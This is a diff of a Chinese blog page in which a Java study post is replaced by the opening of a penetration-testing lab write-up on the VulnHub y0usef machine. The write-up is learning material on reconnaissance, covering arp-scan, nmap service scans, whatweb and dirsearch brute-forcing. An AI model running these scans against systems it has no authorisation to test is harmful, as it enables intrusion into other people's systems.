@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://blog.kekwy.com/javanotes-2/"/>
+  <link rel="canonical" href="http://blog.kekwy.com/渗透测试学习笔记/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,23 +33,24 @@
   <!-- feed -->
       <link rel="alternate" href="/atom.xml" title="铃的杂货铺" type="application/atom+xml">
   <!-- 页面元数据 -->
-  <title>类的高级特性与异常处理 - 铃的杂货铺</title>
-  <meta name="keywords" content="Java,学习,编程,null">
+  <title>渗透测试学习笔记lab1【y0usef】 - 铃的杂货铺</title>
+  <meta name="keywords" content="学习,Kali,网络,安全,null">
   <meta desc name="description" content="喜欢夏天的无名之辈 - 可弟WZ铃号机 - 铃的杂货铺">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="类的高级特性与异常处理">
-<meta property="og:url" content="http://blog.kekwy.com/javaNotes-2/index.html">
+<meta property="og:title" content="渗透测试学习笔记lab1【y0usef】">
+<meta property="og:url" content="http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="铃的杂货铺">
-<meta property="og:description" content="I. Java类包 类名冲突： 任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。  类的路径：  同一个类包中的类相互访问时，可以不指定包名； 同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。   指定包与导入包： 将 package 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。 1pack">
+<meta property="og:description" content="渗透测试学习笔记lab1 第一周 可弟WZ 主页：blog.kekwy.com 邮箱：&amp;#x6b;&amp;#x65;&amp;#101;&amp;#107;&amp;#x6b;&amp;#x65;&amp;#119;&amp;#x79;&amp;#64;&amp;#x71;&amp;#113;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#109; 2022年9月27日  目录[TOC] 一、实验准备靶机：y0usef 下载链接：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;en">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://blog.kekwy.com/media/images/logo.png">
-<meta property="article:published_time" content="2022-08-01T11:50:13.000Z">
-<meta property="article:modified_time" content="2022-08-04T04:25:52.401Z">
+<meta property="article:published_time" content="2022-09-27T04:44:31.000Z">
+<meta property="article:modified_time" content="2022-09-27T04:45:15.278Z">
 <meta property="article:author" content="可弟WZ铃号机">
-<meta property="article:tag" content="Java">
 <meta property="article:tag" content="学习">
-<meta property="article:tag" content="编程">
+<meta property="article:tag" content="Kali">
+<meta property="article:tag" content="网络">
+<meta property="article:tag" content="安全">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://blog.kekwy.com/media/images/logo.png">
   <style>
@@ -2704,7 +2705,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/javaNotes-2/">
+  <link itemprop="mainEntityOfPage" href="http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="铃的杂货铺">
   </span>
@@ -2718,7 +2719,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class='headimg-div'>
       <a class='headimg-a'>
-        <img itemprop="image" class='headimg' src='/media/javaNotes-2/headimg.png'/>
+        <img itemprop="image" class='headimg' src='/media/渗透测试学习笔记/kali-ascii-16x9.png'/>
       </a>
     </div>
   
@@ -2727,7 +2728,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        类的高级特性与异常处理
+        渗透测试学习笔记lab1【y0usef】
       </h1>
       <div class='new-meta-box'>
         
@@ -2746,10 +2747,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/">从继承开始的Java应用笔记</a>
+    <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">渗透测试学习笔记</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E4%BB%8E%E7%BB%A7%E6%89%BF%E5%BC%80%E5%A7%8B%E7%9A%84Java%E5%BA%94%E7%94%A8%E7%AC%94%E8%AE%B0/" itemprop="url"><span itemprop="name">从继承开始的Java应用笔记</span></a>
+        <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url"><span itemprop="name">渗透测试学习笔记</span></a>
       </span>
     
   </div>
@@ -2758,10 +2759,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-08-01T19:50:13+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-09-27T12:44:31+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2022年8月1日</p>
+    <p>发布于：2022年9月27日</p>
   </a>
 </div>
 
@@ -2776,7 +2777,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <p>
       <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
       
-      <span id="lc-pv" data-title="类的高级特性与异常处理" data-path="/javaNotes-2/">
+      <span id="lc-pv" data-title="渗透测试学习笔记lab1【y0usef】" data-path="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
         <span id='number'><i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i></span>
       </span>
       
@@ -2798,206 +2799,197 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <div class="story post-story"><h2 id="I-Java类包"><a href="#I-Java类包" class="headerlink" title="I. Java类包"></a>I. Java类包</h2><ol>
-<li><p>类名冲突：</p>
-<p>任何类与接口都需要隶属于某一个类包。可以通过将两个同名类定义在不同的类包中解决类名冲突的问题。</p>
+    <h1 id="渗透测试学习笔记lab1"><a href="#渗透测试学习笔记lab1" class="headerlink" title="渗透测试学习笔记lab1"></a>渗透测试学习笔记lab1</h1><blockquote>
+<p>第一周</p>
+<p>可弟WZ</p>
+<p>主页：blog.kekwy.com</p>
+<p>邮箱：<a href="mailto:&#x6b;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;">&#x6b;&#x65;&#101;&#107;&#x6b;&#x65;&#119;&#x79;&#64;&#x71;&#113;&#x2e;&#x63;&#x6f;&#109;</a></p>
+<p>2022年9月27日</p>
+</blockquote>
+<div class="story post-story"><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>[TOC]</p>
+</div><div class="story post-story"><h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/y0usef-1,624/">https://www.vulnhub.com/entry/y0usef-1,624/</a></p>
+<p>攻击机：kali</p>
+</div><div class="story post-story"><h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>取得目标靶机的root权限和2个flag。</p>
+</div><div class="story post-story"><h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><ol>
+<li><p>在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。</p>
 </li>
-<li><p>类的路径：</p>
-<ul>
-<li>同一个类包中的类相互访问时，可以不指定包名；</li>
-<li>同一个包中的类不必存放在同一个位置，只要将CLASSPATH分别指向这两个位置即可。</li>
-</ul>
-</li>
-<li><p>指定包与导入包：</p>
-<p>将 <code>package</code> 表达式作为文件中的第一行非注释代码，java包名必须全部使用小写字母。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 包名;</span><br></pre></td></tr></table></figure>
+<li><p>在kali中执行以下指令进行局域网主机发现：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br></pre></td></tr></table></figure>
 
-<p>导入包：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.*</span><br><span class="line"><span class="keyword">import</span> 包名.类名</span><br><span class="line"><span class="keyword">import</span> 包名.静态方法名</span><br></pre></td></tr></table></figure>
-<p>tips: </p>
-<p>使用 <code>import</code> 关键字指定一个包中的所有类时，并不会指定这个包的子包中的类，如需使用需要对子包作单独引用。</p>
+<p>扫描结果如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/1cef153a60244fbfb133af7b8e5cb3fa.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/1cef153a60244fbfb133af7b8e5cb3fa.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921103912013"> </p>
+<p>可以推断<sup>1</sup>出靶机 地址为 <code>10.0.2.5</code> 。</p>
+<p><a id="jump1"></a></p>
+<p><code>1：</code> 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。</p>
 </li>
-</ol>
-</div><div class="story post-story"><h2 id="II-final-关键字"><a href="#II-final-关键字" class="headerlink" title="II. final 关键字"></a>II. final 关键字</h2><ol>
-<li>变量：<ul>
-<li>修饰常量变量；</li>
-<li>对象引用被 <code>final</code> 修饰后无法使其指向另一个对象；</li>
-<li>Java中定义全局变量，通常使用 <code>public static final</code> 修饰，是能在定义时被赋值。</li>
-</ul>
-</li>
-<li>方法：<ul>
-<li>被 <code>final</code> 修饰的方法不能被重写；</li>
-<li><code>private</code> 方法隐式被指定为 <code>final</code> 类型。</li>
-</ul>
-</li>
-<li>类：<ul>
-<li>被修饰的类不能被继承。</li>
-</ul>
-</li>
-</ol>
-</div><div class="story post-story"><h2 id="III-内部类"><a href="#III-内部类" class="headerlink" title="III. 内部类"></a>III. 内部类</h2><h3 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h3><ol>
-<li><p>基础用法：</p>
-<ul>
-<li><p>成员内部类的定义：（非内部类不能被声明为private或protected访问类型）</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;			<span class="comment">// 外部类</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> &#123;		<span class="comment">// 内部类</span></span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>内部类中可以访问外部类的所有成员变量和方法，外部类只能通过实例化内部类对象访问内部类成员（受权限修饰关键字限制）；</p>
-</li>
-<li><p>内部类中的变量与外部类变量同名时，可以使用 <code>this</code> 指针加以区分：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 若内部类与外部类中均有变量x</span></span><br><span class="line"><span class="built_in">this</span>.x; <span class="comment">// 内部类的x</span></span><br><span class="line">OuterClass.<span class="built_in">this</span>.x; <span class="comment">// 外部类的x</span></span><br><span class="line">x; <span class="comment">// 同名局部变量、形参（若有）</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在外部类和非静态方法之外实例化内部类对象，需要使用外部类：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> = <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line">OuterClass.<span class="type">innerClass</span> <span class="variable">in</span> <span class="operator">=</span> out.<span class="keyword">new</span> <span class="title class_">innerClass</span>();</span><br></pre></td></tr></table></figure>
+<li><p>在kali中执行以下指令扫描靶机的端口状态：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.5</span></span><br></pre></td></tr></table></figure>
 
-<p>内部类对象会依赖于外部类对象。只有存在外部类对象，才能实例化内部类对象。</p>
-</li>
-</ul>
-</li>
-<li><p>内部类向上转型为接口;</p>
-<ul>
-<li>将一个权限修饰符为 <code>private</code> 的内部类向上转型为一个接口，就可以完全隐藏内部类的具体实现过程；</li>
-<li>对于一个外部接口中的方法，可以通过在一个类中定义多个内部类，每个内部类分别实现该方法的方式，实现在类中多次实现接口中的同一个方法；</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OuterClass</span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个外部不可访问的内部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">InnerClass</span> <span class="keyword">implements</span> <span class="title class_">OutInterface</span> &#123;</span><br><span class="line">        <span class="comment">// 实现接口方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// do something...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> OutInterface doit &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">InnerClass</span>(); <span class="comment">// 将内部类向上转型为外部接口</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="type">OuterClass</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OuterClass</span>();</span><br><span class="line"><span class="type">OutInterface</span> <span class="variable">outinter</span> <span class="operator">=</span> out.doit();</span><br><span class="line">outinter.f();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>外部不可直接访问内部类中的 f() 方法但是可以访问接口中的，通过将内部类向上转型执行内部类中定义的方法，对继承外部类的子类隐藏了实现细节。（向外提供外部类和接口）</p>
-</li>
-</ol>
-<h3 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h3><ul>
-<li><p>内部类可以在类的局部位置定义（如方法）</p>
-</li>
-<li><p>在方法中定义的内部类只能使用方法中被 <code>final</code> 修饰的变量。因为内部类对象的生存期超出方法运行的生存期，导致方法中的一般局部变量比内部类对象的生存期短，而被final型变量被视为常量，其生存期同样比方法运行的生存期长。</p>
-</li>
-</ul>
-<h3 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">A</span>() &#123;</span><br><span class="line">	...<span class="comment">//内部类体</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>匿名内部类编译以后，产生以“外部类名$序号”为名称的.class文件，序号以1~n排列。</p>
-<h3 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h3><ul>
-<li>创建静态内部类的对象不需要其外部类的对象；</li>
-<li>静态内部类的对象中不能访问非静态外部类的对象。</li>
-</ul>
-<h3 id="内部类的继承"><a href="#内部类的继承" class="headerlink" title="内部类的继承"></a>内部类的继承</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OutputInnerClass</span> <span class="keyword">extends</span> <span class="title class_">ClassA</span>.ClassB &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">OutputInnerClass</span><span class="params">(classA a)</span> &#123;</span><br><span class="line">		a.<span class="built_in">super</span>();		<span class="comment">// 生成B类的外部类对象</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ClassB</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>扫描结果如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/3e040fc801ef4729bcdcab28371304ef.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/3e040fc801ef4729bcdcab28371304ef.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921083225282"> </p>
+<p>发现开通了22、80两个端口，提示我们可以考虑靶机上的<code>ssh</code>与<code>http</code>服务。为了进一步确定各端口的用途，我们可以通过以下指令<sup>2</sup>获取对应的服务版本信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p22,80 -sV -sC 10.0.2.5</span></span><br></pre></td></tr></table></figure>
 
 
 
-</div><div class="story post-story"><h2 id="IV-异常捕捉"><a href="#IV-异常捕捉" class="headerlink" title="IV. 异常捕捉"></a>IV. 异常捕捉</h2><ol>
-<li><p><code>try-catch</code> 语句：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 可以发生异常的代码块</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a id="jump2"></a></p>
+<p><code>2:</code> <code>-p</code> 对指定端口扫描</p>
+<p>​	    <code>-sV -sC</code> 默认安全脚本扫描</p>
+<p>扫描结果如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/ec5969c0f78246a0a57d82f63526d361.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/ec5969c0f78246a0a57d82f63526d361.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921111148084"> </p>
 </li>
-<li><p><code>finally</code> 语句：</p>
-<p>无论 <code>try</code> 中的语句是否发生异常，都会执行 <code>finally</code> 中的代码块。<code>finally</code> 不被执行的情况：</p>
-<ul>
-<li><code>finally</code> 中发生异常；</li>
-<li>之前的代码中使用 <code>System.exit()</code> 退出程序；</li>
-<li>程序所在的线程死亡；</li>
-<li>关闭CPU。</li>
-</ul>
+<li><p>我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码：</p>
+<p><img src="https://img-blog.csdnimg.cn/8443950f64a241418f228c0360ee003c.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/8443950f64a241418f228c0360ee003c.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921111747118"> </p>
+<p> 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的<code>robots.txt</code>文件<sup>3</sup>：</p>
+<img src="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/e935d6b0db29459285191574144fb485.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921112049063" style="zoom:67%;" /> 
+
+<p>但令人遗憾的是，我们并不能查看该文件。</p>
+<p><a id="jump3"></a></p>
+<p><code>3:</code> Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。</p>
 </li>
-</ol>
-<p>tips：</p>
-<ul>
-<li><code>Exception</code> 是 <code>try</code> 代码传递给 <code>catch</code> 代码块的变量类型；</li>
-<li>异常处理常用的函数：<ul>
-<li><code>getMessage()</code> ：输出错误性质；</li>
-<li><code>toString()</code> ：给出异常的类型与性质；</li>
-<li><code>printStackTrace()</code> ：指出异常的类型、性质、栈层次及出现在程序中的位置。</li>
-</ul>
-</li>
-</ul>
-</div><div class="story post-story"><h2 id="V-Java常见异常"><a href="#V-Java常见异常" class="headerlink" title="V. Java常见异常"></a>V. Java常见异常</h2><table>
+<li><p>使用whatweb工具查看web应用所采用的软件构架：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb http://10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/2171dc1ef08047c0b87a380f5d4a7cb3.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/2171dc1ef08047c0b87a380f5d4a7cb3.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921151941056"> </p>
+<p>尝试使用工具<code>dirsearch</code>爆破 web 服务端的路径，发现一些隐藏的路径和文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dirsearch -u http://10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<img src="https://img-blog.csdnimg.cn/21596c4a38f24eb6a52e95fd6934c272.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/21596c4a38f24eb6a52e95fd6934c272.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921091507301" style="zoom: 50%;" /> 
+
+<p>得知<sup>4</sup>服务器上有三个我们可以访问的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/adminstration</span><br><span class="line">/index.php</span><br><span class="line">/index.php/login</span><br></pre></td></tr></table></figure>
+
+<p>其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。</p>
+<p><a id="jump4"></a></p>
+<p><code>4:</code> HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。</p>
+<p>上述结果中出现的状态码的含义分别为：</p>
+<table>
 <thead>
 <tr>
-<th>异常类</th>
-<th>说明</th>
+<th>状态码</th>
+<th>含义</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>ClassCastException</td>
-<td>类型转换异常</td>
+<td>403</td>
+<td>(禁止)服务器拒绝请求。</td>
 </tr>
 <tr>
-<td>ClassNotFoundException</td>
-<td>未找到相应类异常</td>
+<td>301</td>
+<td>(永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。</td>
 </tr>
 <tr>
-<td>ArithmeticException</td>
-<td>算术异常</td>
-</tr>
-<tr>
-<td>ArrayIndexOutOfBoundsException</td>
-<td>数组下标越界异常</td>
-</tr>
-<tr>
-<td>ArrayStoreException</td>
-<td>数组中包含不兼容的值抛出的异常</td>
-</tr>
-<tr>
-<td>SQLException</td>
-<td>操作数据库异常</td>
-</tr>
-<tr>
-<td>NullPointerException</td>
-<td>空指针异常</td>
-</tr>
-<tr>
-<td>NoSuchFieldException</td>
-<td>字段未找到异常</td>
-</tr>
-<tr>
-<td>NoSuchMethodException</td>
-<td>方法未找到异常</td>
-</tr>
-<tr>
-<td>NumberFormatException</td>
-<td>字符串转换为数字抛出的异常</td>
-</tr>
-<tr>
-<td>NegativeArraySizeException</td>
-<td>数组元素个数为负数抛出的异常</td>
-</tr>
-<tr>
-<td>StringIndexOutOfBoundsException</td>
-<td>字符串索引超出范围抛出的异常</td>
-</tr>
-<tr>
-<td>IOException</td>
-<td>输入输出异常</td>
-</tr>
-<tr>
-<td>IllegalAccessException</td>
-<td>不允许访问某类异常</td>
-</tr>
-<tr>
-<td>InstantiationException</td>
-<td>当应用程序试图使用 <code>Class</code> 类中的 <code>new Instance()</code> 方法创建一个类的实例，而指定的类的对象无法被实例化时，抛出该异常</td>
-</tr>
-<tr>
-<td>EOFException</td>
-<td>文件已结束异常</td>
-</tr>
-<tr>
-<td>FileNotFoundException</td>
-<td>文件未找到异常</td>
+<td>200</td>
+<td>(成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。</td>
 </tr>
 </tbody></table>
-</div><div class="story post-story"><h2 id="VI-自定义异常"><a href="#VI-自定义异常" class="headerlink" title="VI. 自定义异常"></a>VI. 自定义异常</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(String ErrorMessage)</span> &#123; <span class="comment">// ErrorMessage为要输出的错误信息</span></span><br><span class="line">        <span class="built_in">super</span>(ErrorMessage);				  <span class="comment">// 调用父类构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-</div><div class="story post-story"><h2 id="VII-抛出异常"><a href="#VII-抛出异常" class="headerlink" title="VII. 抛出异常"></a>VII. 抛出异常</h2><ol>
-<li><p>throws：用于指定方法可能抛出的异常，用于将异常向上抛出。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> <span class="keyword">throws</span> 异常<span class="number">1</span>, 异常<span class="number">2</span>, ... &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>throw：</p>
-<ul>
-<li>程序在执行到 <code>throw</code> 语句时立即终止，其后语句都不执行；</li>
-<li><code>throw</code> 抛出的异常必须使用 <code>try-catch</code> 语句快捕捉；</li>
